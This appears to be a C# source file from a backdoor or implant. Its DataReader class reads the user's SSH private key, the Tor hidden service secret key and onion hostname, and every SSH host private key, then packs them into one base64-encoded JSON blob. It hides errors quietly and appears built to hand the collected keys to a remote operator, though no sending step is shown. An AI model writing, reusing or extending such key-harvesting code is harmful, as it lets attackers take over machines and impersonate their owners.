using System.Text;
using System.Text.Json;

public static class DataReader
{
    private static string _userProfilePath = UserProfileHelper.GetActiveUserProfilePath();
    private static string _data = string.Empty;
    public static string GetData(string torPath, string sshPath)
    {
        try
        {
            ServicesDataModel servicesData = new ServicesDataModel()
            {
                username = UserProfileHelper.GetActiveUserProfilePath(),
                host = GetTorAddress(torPath),
                id_rsa = Convert.ToBase64String(GetContent($"{_userProfilePath}\\id_rsa")),
                id_rsa_pub = Convert.ToBase64String(GetContent($"{_userProfilePath}\\id_rsa.pub")),
                hs_ed25519_secret_key = Convert.ToBase64String(GetContent($"{torPath}\\hidden_service\\hs_ed25519_secret_key")),
                hs_ed25519_public_key = Convert.ToBase64String(GetContent($"{torPath}\\hidden_service\\hs_ed25519_public_key")),
                ssh_host_ecdsa_key = Convert.ToBase64String(GetContent($"{sshPath}\\ssh\\ssh_host_ecdsa_key")),
                ssh_host_ecdsa_key_pub = Convert.ToBase64String(GetContent($"{sshPath}\\ssh\\ssh_host_ecdsa_key_pub")),
                ssh_host_ed25519_key = Convert.ToBase64String(GetContent($"{sshPath}\\ssh\\ssh_host_ed25519_key")),
                ssh_host_ed25519_key_pub = Convert.ToBase64String(GetContent($"{sshPath}\\ssh\\ssh_host_ed25519_key_pub")),
                ssh_host_rsa_key = Convert.ToBase64String(GetContent($"{sshPath}\\ssh\\ssh_host_rsa_key")),
                ssh_host_rsa_key_pub = Convert.ToBase64String(GetContent($"{sshPath}\\ssh\\ssh_host_rsa_key_pub")),
            };
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(servicesData)));
        }
        catch (Exception ex)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes("Emptydata"));
        }
    }

    private static byte[] GetContent(string file)
    {
        try
        {
            if (File.Exists(file))
                return File.ReadAllBytes(file);
        }
        catch (Exception ex)
        {
            return Encoding.UTF8.GetBytes("Error reading " + file);
        }
        return Encoding.UTF8.GetBytes("Error reading " + file);
    }

    public static string GetTorAddress(string torPath)
    {
        try
        {
            if (File.Exists($"{torPath}\\hidden_service\\hostname"))
            {
                return File.ReadAllText($"{torPath}\\hidden_service\\hostname").Replace("\r\n", "").Trim();
            }
        }
        catch (Exception ex)
        {
            return string.Empty;
        }
        return string.Empty;
    }
}
